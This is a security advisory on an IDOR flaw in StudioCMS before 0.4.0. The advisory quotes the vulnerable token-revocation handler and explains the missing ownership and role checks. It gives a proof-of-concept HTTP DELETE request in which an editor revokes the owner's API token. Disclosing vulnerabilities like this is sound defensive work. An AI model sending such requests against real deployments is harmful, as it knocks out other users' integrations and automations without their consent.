# [H] StudioCMS: IDOR — Arbitrary API Token Revocation Leading to Denial of Service

## Summary
Severity: High
Advisory: GHSA-8rgj-vrfr-6hqr
CVE: CVE-2026-30945
CWE: CWE-639
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H (CVSS_V3)
Published: 2026-03-11
Source: https://github.com/advisories/GHSA-8rgj-vrfr-6hqr
Type: github-advisory

## Affected
- npm: `studiocms` — affected >=0 <0.4.0

## Details
## Summary
The DELETE /studiocms_api/dashboard/api-tokens endpoint allows any authenticated user with editor privileges or above to revoke API tokens belonging to any other user, including admin and owner accounts. The handler accepts tokenID and userID directly from the request payload without verifying token ownership, caller identity, or role hierarchy. This enables targeted denial of service against critical integrations and automations.

## Details
#### Vulnerable Code
The following is the server-side handler for the `DELETE /studiocms_api/dashboard/api-tokens` endpoint (`revokeApiToken`):

**File:** packages/studiocms/frontend/pages/studiocms_api/dashboard/api-tokens.ts (lines 58–99)
**Version:** studiocms@0.3.0
```
DELETE: (ctx) =>
    genLogger('studiocms/routes/api/dashboard/api-tokens.DELETE')(function* () {
        const sdk = yield* SDKCore;

        // Check if demo mode is enabled
        if (developerConfig.demoMode !== false) {
            return apiResponseLogger(403, 'Demo mode is enabled, this action is not allowed.');
        }

        // Get user data
        const userData = ctx.locals.StudioCMS.security?.userSessionData;       // [1]

        // Check if user is logged in
        if (!userData?.isLoggedIn) {                                            // [2]
            return apiResponseLogger(403, 'Unauthorized');
        }

        // Check if user has permission
        const isAuthorized = ctx.locals.StudioCMS.security?.userPermissionLevel.isEditor;  // [3]
        if (!isAuthorized) {
            return apiResponseLogger(403, 'Unauthorized');
        }

        // Get Json Data
        const jsonData = yield* readAPIContextJson<{
            tokenID: string;                                                    // [4]
            userID: string;                                                     // [5]
        }>(ctx);

        // Validate form data
        if (!jsonData.tokenID) {
            return apiResponseLogger(400, 'Invalid form data, tokenID is required');
        }

        if (!jsonData.userID) {
            return apiResponseLogger(400, 'Invalid form data, userID is required');
        }

        // [6] Both user-controlled values passed directly — no ownership or identity checks
        yield* sdk.REST_API.tokens.delete({ tokenId: jsonData.tokenID, userId: jsonData.userID });

        return apiResponseLogger(200, 'Token deleted');                         // [7]
    }),
```
**Analysis**
The handler shares the same class of authorization flaws found in the token generation endpoint, applied to a destructive operation:
1. **Insufficient permission gate [1][2][3]:** The handler retrieves the session from ctx.locals.StudioCMS.security and only checks isEditor. Token revocation is a high-privilege operation that should require ownership of the token or elevated administrative privileges — not a generic editor-level gate.
2. **No token ownership validation [4][6]:** The handler does not verify that jsonData.tokenID actually belongs to the jsonData.userID supplied in the payload. An attacker could enumerate or guess token IDs and revoke them regardless of ownership.
3. **Missing caller identity check [5][6]:** The jsonData.userID from the payload is never compared against userData (the authenticated caller from [1]). Any editor can specify an arbitrary target user UUID and revoke their tokens.
4. **No role hierarchy enforcement [6]:** There is no check preventing a lower-privileged user (editor) from revoking tokens belonging to higher-privileged accounts (admin, owner).
5. **Direct pass-through to destructive operation [6][7]:** Both user-controlled parameters are passed directly to sdk.REST_API.tokens.delete() without any server-side validation, and the server responds with a generic success message, making this a textbook IDOR.

## PoC
**Environment**
*User ID | Role*
2450bf33-0135-4142-80be-9854f9a5e9f1 | owner
39b3e7d3-5eb0-48e1-abdc-ce95a57b212c | editor

**Attack — Editor Revokes Owner's API Token**
An authenticated editor sends the following request to revoke a token belonging to the owner:
```
DELETE /studiocms_api/dashboard/api-tokens HTTP/1.1
Host: 127.0.0.1:4321
Cookie: auth_session=<editor_session_cookie>
Content-Type: application/json
Accept: application/json
Content-Length: 98

{
  "tokenID": "16a2e549-513b-40ac-8ca3-858af6118afc",
  "userID": "2450bf33-0135-4142-80be-9854f9a5e9f1"
}
```

**Response (HTTP 200):**
```
{"message":"Token deleted"}
```
The server confirmed deletion of the owner's token. The tokenID here refers to the internal token record identifier (UUID), not the JWT value itself. The editor's session cookie was sufficient to authorize this destructive action against a higher-privileged user.

## Impact
- **Denial of Service on integrations:** API tokens used in CI/CD pipelines, third-party integrations, or monitoring systems can be silently revoked, causing automated workflows to fail without warning.
- **No audit trail:** The revocation is processed as a legitimate operation — the only evidence is the editor's own session, making attribution difficult without detailed request logging.

## References
- https://github.com/withstudiocms/studiocms/security/advisories/GHSA-8rgj-vrfr-6hqr
- https://nvd.nist.gov/vuln/detail/CVE-2026-30945
- https://github.com/withstudiocms/studiocms/commit/9eec9c3b45523b635cfe16d55aa55afabacbebe3
- https://github.com/withstudiocms/studiocms
- https://github.com/withstudiocms/studiocms/releases/tag/studiocms@0.4.0
